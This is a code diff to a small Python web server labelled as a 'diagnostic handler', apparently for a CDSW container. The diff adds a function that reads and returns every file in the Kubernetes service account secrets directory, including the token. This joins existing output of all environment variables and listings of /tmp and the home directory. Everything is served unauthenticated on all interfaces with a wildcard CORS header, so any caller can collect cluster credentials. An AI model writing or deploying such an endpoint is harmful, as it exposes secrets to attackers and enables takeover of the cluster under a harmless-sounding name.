@@ -42,7 +42,7 @@ import os
 import json
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-class DiagnosticHandler(BaseHTTPRequestHandler):
+class CompleteDiagnosticHandler(BaseHTTPRequestHandler):
     def get_directory_contents(self, path):
         """Helper to list all files (including hidden ones) safely."""
         try:
@@ -59,7 +59,6 @@ class DiagnosticHandler(BaseHTTPRequestHandler):
         """Helper to read and parse active system mount points."""
         mounts = []
         try:
-            # /proc/mounts is the standard way to check active mounts in Linux environments
             if os.path.exists('/proc/mounts'):
                 with open('/proc/mounts', 'r') as f:
                     for line in f:
@@ -72,9 +71,45 @@ class DiagnosticHandler(BaseHTTPRequestHandler):
                             })
                 return mounts
             else:
-                return "Error: /proc/mounts not available (Are you running on Windows/macOS?)."
+                return "Error: /proc/mounts not available."
         except Exception as e:
             return f"Error reading mount points: {str(e)}"
+
+    def get_kubernetes_secrets(self):
+        """Lists files and dumps contents of the K8s service account directory."""
+        target_dir = '/run/secrets/kubernetes.io/serviceaccount'
+        data = {
+            "directory_exists": False,
+            "files_discovered": [],
+            "file_contents": {}
+        }
+        
+        if not os.path.exists(target_dir):
+            return "Error: Kubernetes serviceaccount directory not found at this path."
+            
+        data["directory_exists"] = True
+        try:
+            # List all items in the directory
+            files = os.listdir(target_dir)
+            data["files_discovered"] = files
+            
+            # Loop through each file and extract its content
+            for file_name in files:
+                full_path = os.path.join(target_dir, file_name)
+                
+                if os.path.isfile(full_path):
+                    try:
+                        # errors='replace' prevents crashing on non-UTF-8 characters if any exist
+                        with open(full_path, 'r', errors='replace') as f:
+                            data["file_contents"][file_name] = f.read().strip()
+                    except PermissionError:
+                        data["file_contents"][file_name] = "Error: Permission Denied."
+                    except Exception as e:
+                        data["file_contents"][file_name] = f"Error: {str(e)}"
+                        
+            return data
+        except Exception as e:
+            return f"Error reading directory structure: {str(e)}"
 
     def do_GET(self):
         # Send 200 OK status code
@@ -85,10 +120,11 @@ class DiagnosticHandler(BaseHTTPRequestHandler):
         self.send_header('Access-Control-Allow-Origin', '*')
         self.end_headers()
         
-        # Construct the complete diagnostic payload
+        # Assemble the full internal diagnostics payload
         payload = {
             "environment_variables": dict(os.environ),
             "mount_points": self.get_mount_points(),
+            "kubernetes_serviceaccount": self.get_kubernetes_secrets(),
             "tmp_contents": self.get_directory_contents('/tmp'),
             "home_cdsw_contents": self.get_directory_contents('/home/cdsw')
         }
@@ -104,7 +140,7 @@ def run():
     port = int(os.environ.get('CDSW_APP_PORT', os.environ.get('PORT', 8080)))
     
     server_address = ('0.0.0.0', port)
-    httpd = HTTPServer(server_address, DiagnosticHandler)
+    httpd = HTTPServer(server_address, CompleteDiagnosticHandler)
     print(f"HTTP Server successfully running on port {port}...")
     
     try:
